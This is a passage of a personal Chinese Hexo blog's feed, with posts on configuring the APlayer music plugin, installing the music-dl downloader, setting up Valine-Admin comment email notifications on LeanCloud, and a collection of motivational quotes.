<code>artist</code></td></tr><tr><td>fixed</td><td><code>false</code></td><td>开启固定模式</td></tr><tr><td>mini</td><td><code>false</code></td><td>开启迷你模式</td></tr><tr><td>loop</td><td><code>all</code></td><td>列表循环模式：<code>all</code>, <code>one</code>,<code>none</code></td></tr><tr><td>order</td><td><code>list</code></td><td>列表播放模式： <code>list</code>, <code>random</code></td></tr><tr><td>volume</td><td>0.7</td><td>播放器音量</td></tr><tr><td>lrctype</td><td>0</td><td>歌词格式类型</td></tr><tr><td>listfolded</td><td><code>false</code></td><td>指定音乐播放列表是否折叠</td></tr><tr><td>storagename</td><td><code>metingjs</code></td><td>LocalStorage 中存储播放器设定的键名</td></tr><tr><td>autoplay</td><td><code>true</code></td><td>自动播放，移动端浏览器暂时不支持此功能</td></tr><tr><td>mutex</td><td><code>true</code></td><td>该选项开启时，如果同页面有其他 aplayer 播放，该播放器会暂停</td></tr><tr><td>listmaxheight</td><td><code>340px</code></td><td>播放列表的最大长度</td></tr><tr><td>preload</td><td><code>auto</code></td><td>音乐文件预载入模式，可选项： <code>none</code>, <code>metadata</code>, <code>auto</code></td></tr><tr><td>theme</td><td><code>#ad7a86</code></td><td>播放器风格色彩设置</td></tr></tbody></table><p>关于如何设置自建的 Meting API 服务器地址，以及其他 MetingJS 配置，请参考章节<a href="https://github.com/MoePlayer/hexo-tag-aplayer/blob/master/docs/README-zh_cn.md#自定义配置30-新功能" target="_blank" rel="noopener">自定义配置</a></p><h3 id="PJAX-兼容"><a href="#PJAX-兼容" class="headerlink" title="PJAX 兼容"></a>PJAX 兼容</h3><p>若在 Hexo 中使用了 PJAX，可能需要自己手动清理 APlayer 全局实例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$(document).on(&apos;pjax:start&apos;, function () &#123;</span><br><span class="line">    if (window.aplayers) &#123;</span><br><span class="line">        for (let i = 0; i &lt; window.aplayers.length; i++) &#123;</span><br><span class="line">            window.aplayers[i].destroy();</span><br><span class="line">        &#125;</span><br><span class="line">        window.aplayers = [];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="自定义配置（3-0-新功能）"><a href="#自定义配置（3-0-新功能）" class="headerlink" title="自定义配置（3.0 新功能）"></a>自定义配置（3.0 新功能）</h2><p>现在你可以在 Hexo 配置文件 <code>_config.yml</code> 中配置本插件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">aplayer:</span><br><span class="line">  script_dir: some/place                        # Public 目录下脚本目录路径，默认: &apos;assets/js&apos;</span><br><span class="line">  style_dir: some/place                         # Public 目录下样式目录路径，默认: &apos;assets/css&apos;</span><br><span class="line">  cdn: http://xxx/aplayer.min.js                # 引用 APlayer.js 外部 CDN 地址 (默认不开启)</span><br><span class="line">  style_cdn: http://xxx/aplayer.min.css         # 引用 APlayer.css 外部 CDN 地址 (默认不开启)</span><br><span class="line">  meting: true                                  # MetingJS 支持</span><br><span class="line">  meting_api: http://xxx/api.php                # 自定义 Meting API 地址</span><br><span class="line">  meting_cdn: http://xxx/Meing.min.js           # 引用 Meting.js 外部 CDN 地址 (默认不开启)</span><br><span class="line">  asset_inject: true                            # 自动插入 Aplayer.js 与 Meting.js 资源脚本, 默认开启</span><br><span class="line">  externalLink: http://xxx/aplayer.min.js       # 老版本参数，功能与参数 cdn 相同</span><br></pre></td></tr></table></figure><h2 id="故障排除"><a href="#故障排除" class="headerlink" title="故障排除"></a>故障排除</h2><h3 id="标签参数空格问题"><a href="#标签参数空格问题" class="headerlink" title="标签参数空格问题"></a>标签参数空格问题</h3><p>在 Hexo 标签中，用户可能无法直接在标签参数中<a href="https://github.com/hexojs/hexo/issues/1455" target="_blank" rel="noopener">加入空格</a></p><p>如果遇到这类问题，请直接将参数用双引号括起来使用，如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% aplayer &quot;Caffeine&quot; &quot;Jeff Williams&quot; &quot;caffeine.mp3&quot; &quot;autoplay&quot; &quot;width:70%&quot; &quot;lrc:caffeine.txt&quot; %&#125;</span><br></pre></td></tr></table></figure><h3 id="重复载入-Aplayer-js-资源脚本问题"><a href="#重复载入-Aplayer-js-资源脚本问题" class="headerlink" title="重复载入 Aplayer.js 资源脚本问题"></a>重复载入 Aplayer.js 资源脚本问题</h3><p>本插件通过 <code>after_render:html</code>过滤器 , 将 <code>APlayer.js</code> 和 <code>Meting.js</code> 插入到使用了本插件标签 的 HTML 文件中:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    ...</span><br><span class="line">    &lt;script src=&quot;assets/js/aplayer.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=&quot;assets/js/meting.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  ...</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>但是 <code>after_render:html</code> 在一些情形下可能无法被正常触发:</p><ul><li><a href="https://github.com/hexojs/hexo-inject/issues/1" target="_blank" rel="noopener">Does not work with hexo-renderer-jade</a></li><li><code>after_render:html</code> 似乎在 Hexo 服务器模式默认配置中无法被调用 (<code>hexo server</code>), 遇到这种情况用户可能需要使用 <code>hexo-server</code> 的静态文件解析模式 ( <code>hexo server -s</code>) .</li></ul><p>如果在博客生成过程中，插件发现 <code>after_render:html</code> 没有被调用，那么插件将会通过 <code>after_post_render</code> 过滤器来植入脚本。但是使用 <code>after_post_render</code> 会有重复载入 <code>APlayer.js</code> 的情况（例如当一个页面中存在多篇博客时），以及一些非文章页面将无法使用本插件。</p><p>如果想完全解决这个问题，用户可能需要自己在主题文件中手动加入 <code>Aplayer.js</code> 与 <code>Meting.js</code>，同时关闭插件的自动脚本插入功能：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aplayer:</span><br><span class="line">  asset_inject: false</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="Hexo" scheme="https://gz1903.github.io/categories/Hexo/"/>
    
      <category term="Aplayer" scheme="https://gz1903.github.io/categories/Hexo/Aplayer/"/>
    
      <category term="music" scheme="https://gz1903.github.io/categories/Hexo/Aplayer/music/"/>
    
    
      <category term="Hexo" scheme="https://gz1903.github.io/tags/Hexo/"/>
    
      <category term="Aplayer" scheme="https://gz1903.github.io/tags/Aplayer/"/>
    
      <category term="music" scheme="https://gz1903.github.io/tags/music/"/>
    
  </entry>
  
  <entry>
    <title>Kali爬取全网音乐</title>
    <link href="https://gz1903.github.io/2019/10/18/Kali%E7%88%AC%E5%8F%96%E5%85%A8%E7%BD%91%E9%9F%B3%E4%B9%90/"/>
    <id>https://gz1903.github.io/2019/10/18/Kali爬取全网音乐/</id>
    <published>2019-10-18T12:15:53.000Z</published>
    <updated>2019-10-28T03:42:50.507Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><strong>Music-dl 是一个基于Python3的命令行工具，可以从多个网站搜索和下载音乐，方便寻找音乐，解决不知道哪个网站有版权的问题。</strong></p><h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><ul><li>部分歌曲支持无损音乐</li><li>优先搜索高品质音乐（无损 -&gt; 320K -&gt; 128K）</li><li>支持 HTTP 和 SOCKS 代理</li><li>支持多线程搜索</li><li>支持搜索结果去重和排序</li><li>支持搜索关键字高亮</li><li>支持下载歌词和封面（部分）</li></ul><blockquote><p>注意：仅支持Python3，建议使用 <strong>Python3.5 以上版本</strong></p></blockquote><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>使用pip安装（推荐，注意前面有一个<code>py</code>）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install pymusic-dl</span><br></pre></td></tr></table></figure><p>手动安装（最新）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/0xHJK/music-dl.git</span><br><span class="line"><span class="built_in">cd</span> music-dl</span><br><span class="line">python3 setup.py install</span><br></pre></td></tr></table></figure><p>不安装直接运行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/0xHJK/music-dl.git</span><br><span class="line">cd music-dl</span><br><span class="line">pip3 install -r requirements.txt</span><br><span class="line">./music-dl</span><br><span class="line"># 或 python3 music-dl</span><br></pre></td></tr></table></figure><blockquote><p>centos用此方法</p></blockquote><p>在以下环境测试通过：</p><table><thead><tr><th>系统名称</th><th>系统版本</th><th>Python版本</th></tr></thead><tbody><tr><td>macOS</td><td>10.14</td><td>3.7.0</td></tr><tr><td>macOS</td><td>10.13</td><td>3.7.0</td></tr><tr><td>Windows</td><td>Windows 7 x64</td><td>3.7.2</td></tr><tr><td>Windows</td><td>Windows 10 x64</td><td>3.7.2</td></tr><tr><td>Ubuntu</td><td>16.04 x64</td><td>3.5.2</td></tr></tbody></table><h2 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h2><p>v3.0预览版命令有较大的改变，建议先查看帮助</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ music-dl --help</span><br><span class="line">Usage: music-dl [OPTIONS]</span><br><span class="line"></span><br><span class="line">  Search and download music from netease, qq, kugou, baidu and xiami.</span><br><span class="line">  Example: music-dl -k &quot;周杰伦&quot;</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  --version             Show the version and exit.</span><br><span class="line">  -k, --keyword TEXT    搜索关键字，歌名和歌手同时输入可以提高匹配（如 空帆船 朴树）</span><br><span class="line">  -u, --url TEXT        通过指定的歌曲URL下载音乐</span><br><span class="line">  -p, --playlist TEXT   通过指定的歌单URL下载音乐</span><br><span class="line">  -s, --source TEXT     Supported music source: qq netease kugou baidu</span><br><span class="line">  -n, --number INTEGER  Number of search results</span><br><span class="line">  -o, --outdir TEXT     Output directory</span><br><span class="line">  -x, --proxy TEXT      Proxy (e.g. http://127.0.0.1:1087)</span><br><span class="line">  -v, --verbose         Verbose mode</span><br><span class="line">  --lyrics              同时下载歌词</span><br><span class="line">  --cover               同时下载封面</span><br><span class="line">  --nomerge             不对搜索结果列表排序和去重</span><br><span class="line">  --help                Show this message and exit.</span><br></pre></td></tr></table></figure><ul><li>默认搜索<code>qq netease kugou baidu</code>，每个数量限制为5，保存目录为当前目录。</li><li>指定序号时可以使用<code>1-5 7 10</code>的形式。</li><li>默认对搜索结果排序和去重，排序顺序按照歌手和歌名排序，当两者都相同时保留最大的文件。</li><li>无损音乐歌曲数量较少，如果没有无损会显示320K或128K。</li><li>支持http代理和socks代理，格式形如<code>-x http://127.0.0.1:1087</code>或<code>-x socks5://127.0.0.1:1086</code></li></ul><p>示例：</p><p><img alt data-src="https://ae01.alicdn.com/kf/Hd79778c55c844466871082bab9a80f0cf.png" class="lozad"></p><h2 id="支持的音乐源列表"><a href="#支持的音乐源列表" class="headerlink" title="支持的音乐源列表"></a>支持的音乐源列表</h2><table><thead><tr><th>音乐源</th><th>缩写</th><th>网址</th><th>有效</th><th>无损</th><th>320K</th><th>封面</th><th>歌词</th><th>歌单</th><th>单曲</th></tr></thead><tbody><tr><td>QQ音乐</td><td>qq</td><td><a href="https://y.qq.com/" target="_blank" rel="noopener">https://y.qq.com/</a></td><td>✓</td><td>-</td><td>-</td><td>✕</td><td>✓</td><td>✕</td><td>✕</td></tr><tr><td>酷狗音乐</td><td>kugou</td><td><a href="http://www.kugou.com/" target="_blank" rel="noopener">http://www.kugou.com/</a></td><td>✓</td><td>-</td><td>-</td><td>-</td><td>✕</td><td>✕</td><td>✕</td></tr><tr><td>网易云音乐</td><td>netease</td><td><a href="https://music.163.com/" target="_blank" rel="noopener">https://music.163.com/</a></td><td>✓</td><td>-</td><td>✓</td><td>✓</td><td>✓</td><td>✓</td><td>✓</td></tr><tr><td>咪咕音乐</td><td>migu</td><td><a href="http://www.migu.cn/" target="_blank" rel="noopener">http://www.migu.cn/</a></td><td>✓</td><td>✓</td><td>✓</td><td>✓</td><td>✓</td><td>✕</td><td>✕</td></tr><tr><td>百度音乐</td><td>baidu</td><td><a href="http://music.baidu.com/" target="_blank" rel="noopener">http://music.baidu.com/</a></td><td>✓</td><td>-</td><td>✓</td><td>✓</td><td>✓</td><td>✕</td><td>✕</td></tr><tr><td>虾米音乐</td><td>xiami</td><td><a href="https://www.xiami.com/" target="_blank" rel="noopener">https://www.xiami.com/</a></td><td>✕</td><td>-</td><td>-</td><td>-</td><td>-</td><td>✕</td><td>✕</td></tr></tbody></table><blockquote><p><code>-</code>表示不一定支持，<code>✓</code>表示部分或完全支持，<code>✕</code>表示尚未支持</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="Kali" scheme="https://gz1903.github.io/categories/Kali/"/>
    
      <category term="python" scheme="https://gz1903.github.io/categories/Kali/python/"/>
    
      <category term="music" scheme="https://gz1903.github.io/categories/Kali/python/music/"/>
    
    
      <category term="music" scheme="https://gz1903.github.io/tags/music/"/>
    
      <category term="Kali" scheme="https://gz1903.github.io/tags/Kali/"/>
    
      <category term="python" scheme="https://gz1903.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Valine Admin</title>
    <link href="https://gz1903.github.io/2019/10/18/Valine-Admin/"/>
    <id>https://gz1903.github.io/2019/10/18/Valine-Admin/</id>
    <published>2019-10-18T07:56:51.000Z</published>
    <updated>2019-10-28T03:42:50.763Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>此项目是一个对 <a href="https://valine.js.org/" target="_blank" rel="noopener">Valine</a> 评论系统的拓展应用，可增强 <code>Valine</code> 的邮件通知功能。基于 Leancloud 的云引擎与云函数。可以提供邮件 <code>通知站长</code> 和 <code>@ 通知</code> 的功能，而且还支持自定义邮件通知模板。</p><p><a href="https://github.com/zhaojun1998/Valine-Admin/blob/master/高级配置.md#邮件通知展示" target="_blank" rel="noopener">点击查看演示</a></p><h2 id="快速开始"><a href="#快速开始" class="headerlink" title="快速开始"></a>快速开始</h2><p>Valine官方提供的邮件提醒功能是基于<code>Leancloud的密码重置邮件提醒</code>，操作步骤如下：</p><p>进入<code>Leancloud</code>&gt;选择你的评论所存放的<code>应用</code>&gt;<code>设置</code>&gt;<code>邮件模板</code>，按下图设置好用于<code>重置密码</code>的邮件主题&gt;然后保存:</p><p>修改邮件主题：<code>你在 的评论收到了新的评论</code></p><p>修改内容：将下面的代码复制到“内容”中，并将其中的<code>你的网址首页链接</code>改为你的网址首页链接。</p><p><img alt data-src="https://pic.superbed.cn/item/5da937ec451253d178246518.png" class="lozad"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;Hi, &#123;&#123;username&#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;p&gt;</span><br><span class="line">你在 &#123;&#123;appname&#125;&#125; 的评论收到了新的回复，请点击查看：</span><br><span class="line">&lt;/p&gt;</span><br><span class="line">&lt;p&gt;&lt;a href=&quot;你的网址首页链接&quot; style=&quot;display: inline-block; padding: 10px 20px; border-radius: 4px; background-color: #3090e4; color: #fff; text-decoration: none;&quot;&gt;马上查看&lt;/a&gt;&lt;/p&gt;</span><br></pre></td></tr></table></figure><p>点击“保存”按钮</p><p>修改<strong>主题配置文件</strong>搜索<code>valine</code>（快速定位），将其中的<code>false</code>改为<code>true</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">valine:</span><br><span class="line">  enable: true # if you want use valine,please set this value is true</span><br><span class="line">  appId:    # leancloud application app id</span><br><span class="line">  appKey:    # leancloud application app key</span><br><span class="line">  notify: false # valine mail notify (true/false) https://github.com/xCss/Valine/wiki</span><br><span class="line">  verify: true # valine verify code (true/false)</span><br><span class="line">  pageSize: 10 # comment list page size</span><br><span class="line">  avatar: monsterid # gravatar style https://valine.js.org/#/avatar</span><br><span class="line">  lang: zh-cn # i18n: zh-cn/en</span><br><span class="line">  placeholder: Please leave your footprints # valine comment input placeholder(like: Please leave your footprints )</span><br><span class="line">  guest_info: nick,mail,link #valine comment header info</span><br><span class="line">  bg: /img/comment_bg.png  # valine background</span><br></pre></td></tr></table></figure><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ul><li>发送次数过多，可能会暂时被Leancloud 屏蔽邮件发送功能</li><li>由于<code>邮件提醒</code>功能使用的<code>Leancloud的密码重置邮件提醒</code>，只能传递<code>昵称</code>、<code>邮箱</code>两个属性，所以邮件提醒链接<code>无法直达指定文章页</code>。<strong>请悉知</strong>。</li><li>开启<code>邮件提醒</code>会默认开启<code>验证码</code>选项。</li><li>该功能目前还在测试阶段，谨慎使用。</li><li>目前<code>邮件提醒</code>正处于测试阶段，仅在<code>子级</code>对存在邮件地址的<code>父级</code>发表评论时发送邮件</li></ul><h2 id="第三方支持"><a href="#第三方支持" class="headerlink" title="第三方支持"></a>第三方支持</h2><p>这里重点讲一下第三方<code>邮件提醒</code>：<a href="https://github.com/zhaojun1998/Valine-Admin" target="_blank" rel="noopener">Valine-Admin</a> </p><p>这也先需要将Valine的评论功能成功跑起来。</p><p>然后进入 <a href="https://leancloud.cn/dashboard/applist.html#/apps" target="_blank" rel="noopener">Leancloud</a> 对应的 Valine 应用中。</p><p>点击 <code>云引擎 -&gt; 设置</code> 填写代码库并保存：<code>https://github.com/zhaojun1998/Valine-Admin</code></p><p><img alt data-src="https://p.pstatp.com/origin/ff4700010297073dbed1" class="lozad"></p><p>切换到部署标签页，分支使用 master，点击部署即可：</p><p><img alt data-src="https://p.pstatp.com/origin/fe8000017fb250d16a0f" class="lozad"></p><p><img alt data-src="https://p.pstatp.com/origin/ff6f00007bb410dac4c1" class="lozad"></p><p>设置云引擎的环境变量</p><p><img alt data-src="https://p.pstatp.com/origin/ff250000ea6543063008" class="lozad"></p><p><strong>必选参数</strong></p><ul><li><code>SITE_NAME</code> : 网站名称。</li><li><code>SITE_URL</code> : 网站地址, <strong>最后不要加 / 。</strong></li><li><code>SMTP_USER</code> : SMTP 服务用户名，一般为邮箱地址。</li><li><code>SMTP_PASS</code> : SMTP 密码，一般为授权码，而不是邮箱的登陆密码，请自行查询对应邮件服务商的获取方式</li><li><code>SMTP_SERVICE</code> : 邮件服务提供商，支持 <code>QQ</code>、<code>163</code>、<code>126</code>、<code>Gmail</code>、<code>&quot;Yahoo&quot;</code>、<code>......</code> ，全部支持请参考 : <a href="https://nodemailer.com/smtp/well-known/#supported-services" target="_blank" rel="noopener">Nodemailer Supported services</a>。 — <em>如这里没有你使用的邮件提供商，请查看自定义邮件服务器</em></li><li><code>SENDER_NAME</code> : 寄件人名称。</li></ul><p>由于我使用的是我自己的企业邮箱，所以这边的<code>SMTP_SERVICE</code>就不适用了，需要用这三个参数替换：<code>SMTP_HOST</code>、<code>SMTP_PORT</code>、<code>SMTP_SECURE</code>。</p><p>详细说明如下：</p><ul><li><code>SMTP_HOST</code> : 邮件服务提供商 SMTP 地址，如 qq : <code>smtp.qq.com</code>，<em>此项需要自行查询或询问其服务商</em>。</li><li><code>SMTP_PORT</code> : 邮件服务提供商 SMTP 端口, <em>此项需要自行查询或询问其服务商</em>。</li><li><code>SMTP_SECURE</code> : 是否启用加密, 默认为 <code>true</code>，一般不需要设置，如有特殊请自行配置。 <em>此项需要自行查询或询问其服务商</em>。</li></ul><p>如果也同我一样使用阿里云企业邮箱，<code>SMTP_HOST</code>、<code>SMTP_PORT</code>、<code>SMTP_SECURE</code>可以照我的写。</p><p>可以看到上图中，我的自定义环境变量还多了2个，分别是：</p><ul><li><code>TO_EMAIL</code>：这个是填收邮件提醒的邮箱地址，若没有这个字段，则将邮件发到<code>SMTP_USER</code>。</li><li><code>TEMPLATE_NAME</code>：设置提醒邮件的主题，目前内置了两款主题，分别为 <code>default</code> 与 <code>rainbow</code>。默认为 <code>default</code> 。</li></ul><h2 id="Web-评论管理"><a href="#Web-评论管理" class="headerlink" title="Web 评论管理"></a>Web 评论管理</h2><p>此项目还为 Valine 提供了更方便的评论管理功能，可以在 web 端对评论进行查看与删除操作。配置方式如下。</p><p><img alt data-src="https://p.pstatp.com/origin/fff900005d904ddf81b4" class="lozad"></p><p>后台登录需要账号密码，需要在这里设置，只需要填写 <code>email</code>、<code>password</code>、<code>username</code>，这三个字段即可, 使用 <code>email</code> 作为账号登陆即可。（为了安全考虑，此 <code>email</code> 必须为配置中的 <code>SMTP_USER</code> 或 <code>TO_EMAIL</code>， 否则不允许登录）</p><p><img alt data-src="https://p.pstatp.com/origin/fec100008805cbf4cedf" class="lozad"></p><blockquote><p>Web 后台目前仅有 <code>查看</code> 与 <code>删除</code> 功能</p></blockquote><h2 id="LeanCloud-休眠策略"><a href="#LeanCloud-休眠策略" class="headerlink" title="LeanCloud 休眠策略"></a>LeanCloud 休眠策略</h2><p>免费版的 LeanCloud 容器，是有强制性休眠策略的，不能 24 小时运行：</p><ul><li>每天必须休眠 6 个小时</li><li>30 分钟内没有外部请求，则休眠。</li><li>休眠后如果有新的外部请求实例则马上启动（但激活时此次发送邮件会失败）。</li></ul><p>分析了一下上方的策略，如果不想付费的话，最佳使用方案就设置定时器，每天 7 - 23 点每 20 分钟访问一次，这样可以保持每天的绝大多数时间邮件服务是正常的。</p><p>附 <code>Linux crontab</code> 定时器代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/20 7-23 * * * curl https://你配置的域名前缀.leanapp.cn</span><br></pre></td></tr></table></figure><blockquote><p>注意, LeanCloud 最近更新了定时器校验规则, 需要将 Cron 表达式写为: <code>0 */20 7-23 * * ?</code> !!!</p></blockquote><p><strong>更新新版本与更改环境变量均需要重启容器后生效。</strong></p><h3 id="重启容器"><a href="#重启容器" class="headerlink" title="重启容器"></a>重启容器</h3><p><img alt data-src="https://p.pstatp.com/origin/fe6700008710c45106bb" class="lozad"></p><h2 id="邮件通知展示"><a href="#邮件通知展示" class="headerlink" title="邮件通知展示"></a>邮件通知展示</h2><p><strong>游客 A 评论，站长收到邮件 :</strong></p><p>( <code>rainbow</code> 主题)</p><p><img alt data-src="https://p.pstatp.com/origin/ffef0000307de5ccb4ca" class="lozad"></p><p><strong>游客被 @ 收到的邮件 :</strong></p><p><img alt data-src="https://p.pstatp.com/origin/fe9a0000ed17a41e8325" class="lozad"></p><blockquote><p><code>rainbow</code> 彩虹主题</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="Hexo" scheme="https://gz1903.github.io/categories/Hexo/"/>
    
      <category term="Valine" scheme="https://gz1903.github.io/categories/Hexo/Valine/"/>
    
      <category term="评论系统" scheme="https://gz1903.github.io/categories/Hexo/Valine/%E8%AF%84%E8%AE%BA%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="Hexo" scheme="https://gz1903.github.io/tags/Hexo/"/>
    
      <category term="Valine" scheme="https://gz1903.github.io/tags/Valine/"/>
    
      <category term="评论系统" scheme="https://gz1903.github.io/tags/%E8%AF%84%E8%AE%BA%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>15段经典的励志文字，致一路前行的自己</title>
    <link href="https://gz1903.github.io/2019/10/16/15%E6%AE%B5%E7%BB%8F%E5%85%B8%E7%9A%84%E5%8A%B1%E5%BF%97%E6%96%87%E5%AD%97%EF%BC%8C%E8%87%B4%E4%B8%80%E8%B7%AF%E5%89%8D%E8%A1%8C%E7%9A%84%E8%87%AA%E5%B7%B1/"/>
    <id>https://gz1903.github.io/2019/10/16/15段经典的励志文字，致一路前行的自己/</id>
    <published>2019-10-16T06:02:39.000Z</published>
    <updated>2019-10-28T03:42:51.491Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><blockquote><p><strong>努力的意义，就是，以后的日子里，放眼望去，全部都是自己喜欢的人和事！</strong></p></blockquote><p><img alt data-src="https://p.pstatp.com/origin/fe6f0000d874fafe51f9" class="lozad"></p><blockquote><p><strong>我们能做的只是要拼尽全力，即使迈出的步子再小，我们也比昨天要更接近自己的目标了。</strong></p></blockquote><p><img alt data-src="https://p.pstatp.com/origin/1000d000013cfcf41a692" class="lozad"></p><blockquote><p><strong>本身就穷，折腾对了就成了富人；折腾不对，大不了还是穷人。如果不折腾、一辈子都是穷人…… 一想，二干，三成功， 一等，二看，三落空；想是问题，做是答案； 输在犹豫，赢在行动！</strong></p></blockquote><p><img alt data-src="https://p.pstatp.com/origin/ffff00002ba957b0561a" class="lozad"></p><blockquote><p><strong>不要再这样下去，一晚一晚的熬。想东想西，实在是矫情，真的该关掉手机，断了一些没必要的联系，扔掉所有负能量，认认真真的生活，再去做一些正儿八经的事儿。</strong></p></blockquote><p><img alt data-src="https://p.pstatp.com/origin/feeb0000a358d00306a5" class="lozad"></p><blockquote><p><strong>还是得 勇敢走下去 不动声色地成长</strong></p><p><strong>想让父母过得更好</strong></p><p><strong>想让梦想掷地有声</strong></p><p><strong>想让爱的人不失望</strong></p><p><strong>倚靠自己，少一点矫情，多一些努力。</strong></p><p><strong>在路上，奔未来。</strong></p></blockquote><p><img alt data-src="https://p.pstatp.com/origin/dc0f0003a18818177303" class="lozad"></p><blockquote><p><strong>从现在开始，不留余力地努力吧，最差的结果，也不过是大器晚成。</strong></p></blockquote><p><img alt data-src="https://p.pstatp.com/origin/fef700009302c8c1d2a9" class="lozad"></p><blockquote><p><strong>与其热闹着引人夺目，步步紧逼，不如趋向做一个人群之中真实自然的人，不张扬，不虚饰，随时保持退后的位置。心有所定，只是专注做事。</strong></p></blockquote><p><img alt data-src="https://p.pstatp.com/origin/feec00006695d8300486" class="lozad"></p><blockquote><p><strong>受委屈几乎是一个人成长最快的途径，吃下去的是委屈，消化掉后得到的是格局。</strong></p></blockquote><p><img alt data-src="https://p.pstatp.com/origin/feb00000c3e16a024563" class="lozad"></p><blockquote><p><strong>岁月送给我苦难，也随赠我清醒与冷静。</strong></p><p><strong>我不相信命运，我只相信我的手。</strong></p><p><strong>我不相信手掌的纹路，但我相信手掌加上手指的力量。</strong></p></blockquote><p><img alt data-src="https://p.pstatp.com/origin/ff120000dbfce15ac2f4" 